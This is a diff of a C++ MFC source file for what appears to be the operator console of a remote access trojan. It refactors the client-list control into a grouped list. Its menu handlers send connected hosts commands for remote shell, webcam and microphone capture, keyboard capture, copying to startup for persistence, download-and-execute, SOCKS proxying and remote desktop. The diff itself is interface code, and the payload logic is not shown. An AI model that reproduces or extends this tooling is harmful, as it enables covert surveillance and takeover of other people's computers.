@@ -1,63 +1,62 @@
 #include "stdafx.h"
-#include "ClientList.h"
+#include "ClientGroup.h"
 #include "KernelSrv.h"
 #include "Resource.h"
-#include "EditCommentDlg.h"
+#include "GetStrDlg.h"
 #include "UrlInputDlg.h"
 #include "FileSelectDlg.h"
 #include "utils.h"
 #include "MainFrm.h"
 #include "dbg.h"
 
-CClientList::CClientList()
+CClientGroup::CClientGroup(CONST TCHAR * GroupName)
 {
 	m_LastSortColum = 1;
 	m_ascending = 1;
+	lstrcpy(m_GroupName, GroupName);
 }
 
 
-CClientList::~CClientList()
+CClientGroup::~CClientGroup()
 {
 
 }
 
-BEGIN_MESSAGE_MAP(CClientList, CListCtrl)
-	ON_MESSAGE(WM_KERNEL_LOGIN, OnClientLogin)
-	ON_MESSAGE(WM_KERNEL_LOGOUT, OnClientLogout)
-	ON_MESSAGE(WM_CLIENT_EDITCOMMENT, OnEditComment)
-	ON_MESSAGE(WM_KERNEL_GET_MODULE_PATH, OnGetModulePath)
+BEGIN_MESSAGE_MAP(CClientGroup, CMFCListCtrl)
+	
 	ON_WM_CREATE()
-	ON_NOTIFY_REFLECT(NM_RCLICK, &CClientList::OnNMRClick)
-	ON_COMMAND(ID_POWER_REBOOT, &CClientList::OnPowerReboot)
-	ON_COMMAND(ID_POWER_SHUTDOWN, &CClientList::OnPowerShutdown)
-	ON_COMMAND(ID_SESSION_DISCONNECT, &CClientList::OnSessionDisconnect)
-	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CClientList::OnOperationEditcomment)
+	//ON_NOTIFY_REFLECT(NM_RCLICK, &CClientGroup::OnNMRClick)
+	ON_COMMAND(ID_POWER_REBOOT, &CClientGroup::OnPowerReboot)
+	ON_COMMAND(ID_POWER_SHUTDOWN, &CClientGroup::OnPowerShutdown)
+	ON_COMMAND(ID_SESSION_DISCONNECT, &CClientGroup::OnSessionDisconnect)
+	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CClientGroup::OnOperationEditcomment)
 
-	ON_COMMAND(ID_OPERATION_CMD, &CClientList::OnOperationCmd)
-	ON_COMMAND(ID_OPERATION_CHATBOX, &CClientList::OnOperationChatbox)
-	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CClientList::OnOperationFilemanager)
-	ON_COMMAND(ID_OPERATION_CAMERA, &CClientList::OnOperationCamera)
-	ON_COMMAND(ID_SESSION_RESTART, &CClientList::OnSessionRestart)
-	ON_COMMAND(ID_OPERATION_MICROPHONE, &CClientList::OnOperationMicrophone)
-	ON_COMMAND(ID_OPERATION_KEYBOARD, &CClientList::OnOperationKeyboard)
-	ON_COMMAND(ID_UTILS_ADDTO, &CClientList::OnUtilsAddto)
-	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CClientList::OnUtilsCopytostartup)
-	ON_MESSAGE(WM_KERNEL_ERROR, OnKernelError)
-	ON_MESSAGE(WM_KERNEL_UPDATE_UPLODA_STATU, OnUpdateUploadStatu)
-	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CClientList::OnUtilsDownloadandexec)
-	ON_COMMAND(ID_PROXY_SOCKSPROXY, &CClientList::OnProxySocksproxy)
-	ON_COMMAND(ID_SESSION_EXIT, &CClientList::OnSessionExit)
-	ON_COMMAND(ID_UTILS_OPENWEBPAGE, &CClientList::OnUtilsOpenwebpage)
-	ON_COMMAND(ID_OPERATION_PROCESSMANAGER, &CClientList::OnOperationProcessmanager)
-	ON_NOTIFY_REFLECT(LVN_COLUMNCLICK, &CClientList::OnLvnColumnclick)
-	ON_COMMAND(ID_REMOTEDESKTOP_DXGI, &CClientList::OnRemotedesktopDxgi)
-	ON_COMMAND(ID_REMOTEDESKTOP_GDI, &CClientList::OnRemotedesktopGdi)
+	ON_COMMAND(ID_OPERATION_CMD, &CClientGroup::OnOperationCmd)
+	ON_COMMAND(ID_OPERATION_CHATBOX, &CClientGroup::OnOperationChatbox)
+	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CClientGroup::OnOperationFilemanager)
+	ON_COMMAND(ID_OPERATION_CAMERA, &CClientGroup::OnOperationCamera)
+	ON_COMMAND(ID_SESSION_RESTART, &CClientGroup::OnSessionRestart)
+	ON_COMMAND(ID_OPERATION_MICROPHONE, &CClientGroup::OnOperationMicrophone)
+	ON_COMMAND(ID_OPERATION_KEYBOARD, &CClientGroup::OnOperationKeyboard)
+	ON_COMMAND(ID_UTILS_ADDTO, &CClientGroup::OnUtilsAddto)
+	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CClientGroup::OnUtilsCopytostartup)
+
+	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CClientGroup::OnUtilsDownloadandexec)
+	ON_COMMAND(ID_PROXY_SOCKSPROXY, &CClientGroup::OnProxySocksproxy)
+	ON_COMMAND(ID_SESSION_EXIT, &CClientGroup::OnSessionExit)
+	ON_COMMAND(ID_UTILS_OPENWEBPAGE, &CClientGroup::OnUtilsOpenwebpage)
+	ON_COMMAND(ID_OPERATION_PROCESSMANAGER, &CClientGroup::OnOperationProcessmanager)
+	ON_NOTIFY_REFLECT(LVN_COLUMNCLICK, &CClientGroup::OnLvnColumnclick)
+	ON_COMMAND(ID_REMOTEDESKTOP_DXGI, &CClientGroup::OnRemotedesktopDxgi)
+	ON_COMMAND(ID_REMOTEDESKTOP_GDI, &CClientGroup::OnRemotedesktopGdi)
+	ON_WM_CONTEXTMENU()
+	ON_COMMAND(ID_OPERATION_MODIFYGROUP, &CClientGroup::OnOperationModifygroup)
 END_MESSAGE_MAP()
 
 
-int CClientList::OnCreate(LPCREATESTRUCT lpCreateStruct)
+int CClientGroup::OnCreate(LPCREATESTRUCT lpCreateStruct)
 {
-	if (CListCtrl::OnCreate(lpCreateStruct) == -1)
+	if (CMFCListCtrl::OnCreate(lpCreateStruct) == -1)
 		return -1;
 
 	// TODO:  在此添加您专用的创建代码
@@ -84,15 +83,18 @@ int CClientList::OnCreate(LPCREATESTRUCT lpCreateStruct)
 	InsertColumn(10, TEXT("Location"), LVCFMT_LEFT, 100);			//OK
 
 	InsertColumn(11, TEXT("Comment"), LVCFMT_LEFT, 150);			//---
-	InsertColumn(12, TEXT(""), LVCFMT_LEFT, 300);			//---
+	InsertColumn(12, TEXT(""), LVCFMT_LEFT, 350);					//---
 	return 0;
 }
 
-LRESULT CClientList::OnClientLogin(WPARAM wParam, LPARAM lParam)
+
+
+void CClientGroup::OnClientLogin(CKernelSrv * kernel)
 {
-	CKernelSrv*pHandler = (CKernelSrv*)wParam;
-	LoginInfo*pLoginInfo = (LoginInfo*)lParam;
+	CKernelSrv*pHandler = (CKernelSrv*)kernel;
+	LoginInfo*pLoginInfo = (LoginInfo*)kernel->GetLoginInfo();
 	CString Text;
+
 	int idx = GetItemCount();
 
 	//显示目标主机信息
@@ -133,37 +135,32 @@ LRESULT CClientList::OnClientLogin(WPARAM wParam, LPARAM lParam)
 	SetItemText(idx, 12, TEXT(""));
 	//保存Handler
 	SetItemData(idx, (DWORD_PTR)pHandler);
-	return 0;
 }
 
 
-LRESULT CClientList::OnClientLogout(WPARAM wParam, LPARAM lParam)
+void CClientGroup::OnClientLogout(CKernelSrv * kernel)
 {
-	CEventHandler*pHandler = (CEventHandler*)wParam;
+	CEventHandler*pHandler = kernel;
 	LVFINDINFO fi = { 0 };
 	fi.flags = LVFI_PARAM;
-	fi.lParam = wParam;
+	fi.lParam = (WPARAM)kernel;
 	int index = FindItem(&fi);
 
 	//client 未加入login info 就退出,就会导致index < 0,不影响.
 	ASSERT(index >= 0);
 	
 	DeleteItem(index);
-	pHandler->Close();
-	pHandler->Put();
-	return 0;
 }
 
 
-LRESULT CClientList::OnUpdateUploadStatu(WPARAM wParam, LPARAM lParam)
+void CClientGroup::OnUpdateUploadStatus(CKernelSrv * kernel, LPVOID * ArgList)
 {
 	TCHAR           szModuleSize[64];
 	TCHAR           szFinishedSize[64];
-	LPVOID *       ArgList        = (LPVOID*)lParam;
-	CEventHandler*   pHandler     = (CEventHandler*)ArgList[0];
-	CString        ModuleName     =	 (TCHAR*)ArgList[1];
-	LARGE_INTEGER  ModuleSize     = { 0 };
-	LARGE_INTEGER  FinishedSize   = { 0 };
+	CEventHandler*  pHandler       = (CEventHandler*)ArgList[0];
+	CString         ModuleName     =	 (TCHAR*)ArgList[1];
+	LARGE_INTEGER   ModuleSize     = { 0 };
+	LARGE_INTEGER   FinishedSize   = { 0 };
 	//
 	ModuleSize.LowPart= (DWORD)ArgList[2];
 	FinishedSize.LowPart = (DWORD)ArgList[3];
@@ -189,49 +186,21 @@ LRESULT CClientList::OnUpdateUploadStatu(WPARAM wParam, LPARAM lParam)
 
 		SetItemText(index, 12, Status);
 	}
-	return 0;
 }
 
-LRESULT CClientList::OnEditComment(WPARAM wParam, LPARAM lParam)
+void CClientGroup::OnUpdateComment(CKernelSrv *kernel, TCHAR * szNewComment)
 {
 	LVFINDINFO fi = { 0 };
 	fi.flags = LVFI_PARAM;
-	fi.lParam = wParam;
+	fi.lParam = (WPARAM)kernel;
 	int index = FindItem(&fi);
 
 	ASSERT(index >= 0);
-	SetItemText(index, 11, (TCHAR*)lParam);			//编辑注释.
-
-	return 0;
-}
-
-LRESULT CClientList::OnKernelError(WPARAM error, LPARAM lParam)
-{
-	CHAR szIP[64];
-	CString Title;
-	CKernelSrv* kernel =(CKernelSrv*)lParam;
-	kernel->GetPeerAddress(szIP);
-
-	Title.Format(TEXT("[%s]"), CString(szIP));
-
-	MessageBox((TCHAR*)error, Title, MB_ICONWARNING | MB_OK);
-	return 0;
-}
-
-void CClientList::OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult)
-{
-	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
-	// TODO:  在此添加控件通知处理程序代码
-	*pResult = 0;
-
-	CMenu*pMenu = GetParent()->GetMenu()->GetSubMenu(1);
-	POINT pt;
-	GetCursorPos(&pt);
-	pMenu->TrackPopupMenu(TPM_LEFTALIGN, pt.x, pt.y, this);	//阻塞.
+	SetItemText(index, 11, szNewComment);			//编辑注释.
 }
 
 
-void CClientList::OnPowerReboot()
+void CClientGroup::OnPowerReboot()
 {
 	// TODO:  在此添加命令处理程序代码
 	POSITION pos = GetFirstSelectedItemPosition();
@@ -244,7 +213,7 @@ void CClientList::OnPowerReboot()
 }
 
 
-void CClientList::OnPowerShutdown()
+void CClientGroup::OnPowerShutdown()
 {
 	// TODO:  在此添加命令处理程序代码
 	POSITION pos = GetFirstSelectedItemPosition();
@@ -257,7 +226,7 @@ void CClientList::OnPowerShutdown()
 }
 
 
-void CClientList::OnSessionDisconnect()
+void CClientGroup::OnSessionDisconnect()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos){
@@ -268,13 +237,14 @@ void CClientList::OnSessionDisconnect()
 }
 
 
-void CClientList::OnOperationEditcomment()
+void CClientGroup::OnOperationEditcomment()
 {
 	// TODO:  在此添加命令处理程序代码
 	POSITION pos = GetFirstSelectedItemPosition();
 	if (!pos)
 		return;
-	CEditCommentDlg dlg;
+
+	CGetStrDlg dlg(TEXT("Edit Comment"));
 	if (dlg.DoModal() != IDOK)
 		return;
 
@@ -283,12 +253,12 @@ void CClientList::OnOperationEditcomment()
 	{
 		int CurSelIdx = GetNextSelectedItem(pos);
 		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
-		pHandler->EditComment(dlg.m_Comment.GetBuffer());
+		pHandler->EditComment(dlg.m_str.GetBuffer());
 	}
 }
 
 
-void CClientList::OnOperationCmd()
+void CClientGroup::OnOperationCmd()
 {
 	// TODO:  在此添加命令处理程序代码
 	POSITION pos = GetFirstSelectedItemPosition();
@@ -301,7 +271,7 @@ void CClientList::OnOperationCmd()
 }
 
 
-void CClientList::OnOperationChatbox()
+void CClientGroup::OnOperationChatbox()
 {
 	// TODO:  在此添加命令处理程序代码
 	// TODO:  在此添加命令处理程序代码
@@ -314,7 +284,7 @@ void CClientList::OnOperationChatbox()
 	}
 }
 
-void CClientList::OnOperationFilemanager()
+void CClientGroup::OnOperationFilemanager()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -326,7 +296,7 @@ void CClientList::OnOperationFilemanager()
 }
 
 
-void CClientList::OnOperationCamera()
+void CClientGroup::OnOperationCamera()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -338,7 +308,7 @@ void CClientList::OnOperationCamera()
 }
 
 
-void CClientList::OnSessionRestart()
+void CClientGroup::OnSessionRestart()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -350,7 +320,7 @@ void CClientList::OnSessionRestart()
 }
 
 
-void CClientList::OnOperationMicrophone()
+void CClientGroup::OnOperationMicrophone()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -365,7 +335,7 @@ void CClientList::OnOperationMicrophone()
 
 
 
-void CClientList::OnOperationKeyboard()
+void CClientGroup::OnOperationKeyboard()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -377,7 +347,7 @@ void CClientList::OnOperationKeyboard()
 }
 
 
-void CClientList::OnUtilsAddto()
+void CClientGroup::OnUtilsAddto()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -390,7 +360,7 @@ void CClientList::OnUtilsAddto()
 }
 
 
-void CClientList::OnUtilsCopytostartup()
+void CClientGroup::OnUtilsCopytostartup()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -402,7 +372,7 @@ void CClientList::OnUtilsCopytostartup()
 }
 
 
-void CClientList::OnUtilsDownloadandexec()
+void CClientGroup::OnUtilsDownloadandexec()
 {
 	// TODO:  在此添加命令处理程序代码
 	POSITION pos = GetFirstSelectedItemPosition();
@@ -423,7 +393,7 @@ void CClientList::OnUtilsDownloadandexec()
 }
 
 
-void CClientList::OnProxySocksproxy()
+void CClientGroup::OnProxySocksproxy()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -435,7 +405,7 @@ void CClientList::OnProxySocksproxy()
 }
 
 
-void CClientList::OnSessionExit()
+void CClientGroup::OnSessionExit()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -447,7 +417,7 @@ void CClientList::OnSessionExit()
 }
 
 
-void CClientList::OnUtilsOpenwebpage()
+void CClientGroup::OnUtilsOpenwebpage()
 {
 	// TODO:  在此添加命令处理程序代码
 	CUrlInputDlg dlg(TEXT("Please input url:"));
@@ -465,7 +435,7 @@ void CClientList::OnUtilsOpenwebpage()
 }
 
 
-void CClientList::OnOperationProcessmanager()
+void CClientGroup::OnOperationProcessmanager()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -477,25 +447,16 @@ void CClientList::OnOperationProcessmanager()
 }
 
 
-LRESULT CClientList::OnGetModulePath(WPARAM wParam, LPARAM lParam)
+int CALLBACK CClientGroup::CompareByString(LPARAM item1, LPARAM item2, LPARAM obj)
 {
-	TCHAR *		 Path = (TCHAR*)wParam;
-	CMainFrame * pMainFrame = (CMainFrame*)AfxGetMainWnd();
-	CString ModulePath = pMainFrame->Config().GetConfig(TEXT("server"), TEXT("modules"));
-	lstrcpy(Path, ModulePath);
-	return 0;
-}
-
-int CALLBACK CClientList::CompareByString(LPARAM item1, LPARAM item2, LPARAM obj)
-{
-	CClientList * l = (CClientList*)obj;
+	CClientGroup * l = (CClientGroup*)obj;
 	CString s1 = l->GetItemText(item1, l->m_sortCol);
 	CString s2 = l->GetItemText(item2, l->m_sortCol);
 
 	return l->m_ascending * (s1 - s2 );
 }
 
-void CClientList::OnLvnColumnclick(NMHDR *pNMHDR, LRESULT *pResult)
+void CClientGroup::OnLvnColumnclick(NMHDR *pNMHDR, LRESULT *pResult)
 {
 	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
 	// TODO:  在此添加控件通知处理程序代码
@@ -516,7 +477,7 @@ void CClientList::OnLvnColumnclick(NMHDR *pNMHDR, LRESULT *pResult)
 }
 
 
-void CClientList::OnRemotedesktopDxgi()
+void CClientGroup::OnRemotedesktopDxgi()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -528,7 +489,7 @@ void CClientList::OnRemotedesktopDxgi()
 }
 
 
-void CClientList::OnRemotedesktopGdi()
+void CClientGroup::OnRemotedesktopGdi()
 {
 	POSITION pos = GetFirstSelectedItemPosition();
 	while (pos)
@@ -536,5 +497,33 @@ void CClientList::OnRemotedesktopGdi()
 		int CurSelIdx = GetNextSelectedItem(pos);
 		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
 		pHandler->BeginRemoteDesktop_gdi();
+	}
+}
+
+
+void CClientGroup::OnContextMenu(CWnd* /*pWnd*/, CPoint pt)
+{
+	CMenu*pMenu = AfxGetMainWnd()->GetMenu()->GetSubMenu(1);
+	pMenu->TrackPopupMenu(TPM_LEFTALIGN, pt.x, pt.y, AfxGetMainWnd());	//阻塞.
+}
+
+
+void CClientGroup::OnOperationModifygroup()
+{
+	// TODO:  在此添加命令处理程序代码
+	POSITION pos = GetFirstSelectedItemPosition();
+	if (!pos)
+		return;
+
+	CGetStrDlg dlg(TEXT("Modify Group"));
+	if (dlg.DoModal() != IDOK)
+		return;
+
+	pos = GetFirstSelectedItemPosition();
+	while (pos)
+	{
+		int CurSelIdx = GetNextSelectedItem(pos);
+		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
+		pHandler->EditGroup(dlg.m_str.GetBuffer());
 	}
 }
